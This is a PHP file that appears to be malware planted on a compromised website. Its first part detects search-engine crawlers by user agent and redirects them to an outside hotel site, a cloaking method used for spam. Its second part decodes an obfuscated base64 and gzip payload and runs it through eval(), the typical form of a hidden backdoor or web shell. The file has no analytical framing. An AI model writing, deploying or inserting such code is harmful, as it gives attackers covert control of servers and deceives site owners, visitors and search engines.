<?php 
ob_start(); // Memulai output buffering 
 
function is_bot() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'); 
     
    foreach ($bots as $bot) { 
        if (stripos($user_agent, $bot) !== false) { 
            return true; 
        } 
    } 
     
    return false; 
} 
 
if (is_bot()) { 
    // Pastikan tidak ada output sebelum header 
    header("Location: https://hotelspaportamaris.com/", true, 301); 
    exit(); 
} 
ob_end_flush(); // Mengirim output buffer dan menonaktifkannya 
?>
<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "Vk20XJqYYU01\x61punMQ18mdh81e05K1\x2bnM\x63Vw\x63DoM/Of\x41kEwX/jrLNSQI3XI2Qrnn\x63vOqNnJe4Wg\x61eji/\x42uYEl5DELw5yGQi\x42flwLIOKm5/tnk\x61p8\x43M08pWTJVyPgvEV\x63\x2bgE/6fR36S13TTyUqw/IVi\x42rUJdwt5PI\x61IHilK\x41xje6eqw5QVyy3QkLfhEXIIuy\x63p1TZn\x63OvFR4Jpo1do8x7vDk8NuwMf\x42ks\x2b1\x63NwqSix\x4306rSF164I\x2bE54\x42S\x634NllkEeXZidXr2G5ShT3vy\x62JvVi50IME9R8dduMT\x63jgtW\x62p3/8sEovY3\x613F4v\x420FrKY\x61\x61qKX\x43JUzFNldzIP7Z\x429gjOXW\x61Yd3dT00342S\x624JsIUzRMw4KUWQMLT9FOKjvxEDMDV2\x43tu09EQ2P\x42\x41hDKDTzFEjO0hLYZmsuGDWi3yPZsWt7MTjKyKXpmnvq\x2be1uEdO4I\x42QfM\x42430\x41OL\x62r0yVLj\x43e\x61PzZZspsXXmiYuogKZxPnSrQWXr\x41GYDd2q\x42YdYPWGgqvjF\x411R0oDh6Y5xh/Og9D0MKvl\x61hI\x2bhM6uRI8HomEFj4vgHmZqu6\x43L2yUv4llKKOGFGGOOTX\x42Hn514\x43E\x61kHn4D9WMhQYYyWgFiNrtiVf3xWY/Ix2Tj6mX4\x623Jl109SJjxhvZSGOnwRRsLHfRgh3\x2bE4EwDigjO6o7zKjuDq\x43hKQ3lMqRr24WOoL2G14lX\x63\x2bTtFTe6NXZGP91n\x62Gu8Wdq\x42wN\x424/4FY6Ef\x41tSV82hXE35rHN1jDm\x63/EN\x41g0JOIGFDpo\x63Qm\x61tqot/6\x2bjid\x63gh/WmIsYMq/TZw1pqQRU56RpF8I/8/Y\x43K6S0j\x61H91HqtKrSWJLr8v\x61z\x62/wrL1SjP\x41yNHn\x42IYoI\x61teZR8enfneW25YG2\x43kvkkmLYgL12\x2b\x2bX1oS\x62pUI\x62\x2bt0t9sMJmHWD\x61WJKHl\x62j08UHkitgHkx2IW/JsT\x2bD\x42Qi/U\x62T1\x61/MJws\x42wJe9Hk\x41\x2bGQ/8Iww\x42wJe9Hj\x41OHQ/sIw0\x42wJe9Hi\x41eHQ/\x63Iw4\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
